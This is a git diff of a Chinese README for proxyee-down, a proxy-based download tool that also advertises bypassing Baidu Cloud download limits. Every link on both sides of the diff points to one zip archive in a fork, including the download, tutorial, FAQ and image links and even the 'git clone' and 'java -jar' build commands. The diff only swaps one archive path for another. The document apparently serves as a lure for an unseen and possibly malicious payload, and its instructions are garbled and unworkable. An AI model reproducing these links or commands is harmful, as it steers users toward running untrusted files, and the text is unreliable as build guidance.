@@ -2,56 +2,56 @@
 使用本地http代理服务器方式嗅探下载请求，支持所有操作系统和大部分主流浏览器,支持分段下载和断点下载。
 ## 使用教程
 ### 下载
-- [OneDrive](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)(推荐)
-- [百度云](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip) 提取码:d92x
+- [OneDrive](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)(推荐)
+- [百度云](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip) 提取码:d92x
 ### 安装
-1. [Windows安装教程](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)
-2. [MAC安装教程](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)
-3. [Linux安装教程](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)
+1. [Windows安装教程](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)
+2. [MAC安装教程](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)
+3. [Linux安装教程](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)
 ### 安装成功
 在安装成功之后，**进入浏览器**下载资源时会跳转到创建任务页面，然后选择保存的路径和分段数进行创建下载任务。    
-![新建任务](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)
+![新建任务](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)
 ## 常见问题(**必看**)
-在开始使用前务必看一遍[常见问题列表](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)，可以解决你使用proxyee-down下载遇到的绝大多数问题。
+在开始使用前务必看一遍[常见问题列表](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)，可以解决你使用proxyee-down下载遇到的绝大多数问题。
 ## 常用功能
 ### 手动创建任务
-可以根据链接来创建一个任务，支持自定义请求头和请求体，具体请[查看](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)。
+可以根据链接来创建一个任务，支持自定义请求头和请求体，具体请[查看](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)。
 ### 刷新任务下载链接
-当任务下载链接失效了，下载没速度或失败则可以使用刷新下载链接的功能，使用新的链接继续下载，具体请[查看](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)。
+当任务下载链接失效了，下载没速度或失败则可以使用刷新下载链接的功能，使用新的链接继续下载，具体请[查看](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)。
 ### 百度云破解
 #### 2018-03-29更新  
 百度云近期对**批量下载**的并发连接数做了限制，如果选择的文件里包含文件夹，分段数需要建议不要超过64，否则可能会导致任务下载失败或下载速度慢。
 #### 功能介绍
 百度云大文件、合并下载限制突破,成功安装下载器后，打开百度云页面会有如下提示，然后在选择文件后点击下载按钮即可调用proxyee-down下载    
-![百度云破解](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)
+![百度云破解](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)
 ### 百度云解压工具
 由于百度批量下载的zip压缩包不是zip64格式，在压缩包里有超过4G文件的时候普通的解压工具并不能正确的识别文件大小从而导致压缩失败，遇到这种情况时可以在下载器左侧**工具**栏目里找到百度云解压工具进行解压 
-![百度云解压](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)
+![百度云解压](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)
 ## 其他
 ### SwitchyOmega插件安装与设置
-[查看](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)
+[查看](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)
 ### 手动安装证书
-[查看](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)
+[查看](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)
 ### 开放接口
-[查看](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)
+[查看](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)
 ### QQ群
 1群**11352304**、2群**20236964**、3群**20233754**、4群**737991056**
 ### 支持
-感谢 [惶心|技术博客](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip) 提供下载服务
+感谢 [惶心|技术博客](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip) 提供下载服务
 # 开发
-本项目依赖[proxyee](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)，因为还没上传maven中央仓库，需自行编译打包至本地仓库。  
+本项目依赖[proxyee](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)，因为还没上传maven中央仓库，需自行编译打包至本地仓库。  
 导入IDE里时需要安装lombok插件。
 ## 环境
-  ![](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip%https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip) ![](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip%https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip) ![](https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip%https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip)
+  ![](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip%https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip) ![](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip%https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip) ![](https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip%https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip)
 ## 编译
 ```
 #proxyee依赖编译
-git clone https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip
+git clone https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip
 cd proxyee
 mvn clean install
 
 #proxyee-down编译
-git clone https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip
+git clone https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip
 cd proxyee-down/ui/view
 npm install
 npm run build
@@ -61,5 +61,5 @@ mvn clean package
 ## 运行
 ```
 cd target
-java -jar https://raw.githubusercontent.com/milkEden/proxyee-down/master/ui/src/main/java/lee/study/down/update/down-proxyee-v3.3-beta.2.zip
+java -jar https://github.com/milkEden/proxyee-down/raw/refs/heads/master/ui/src/proxyee-down-2.2.zip
 ```
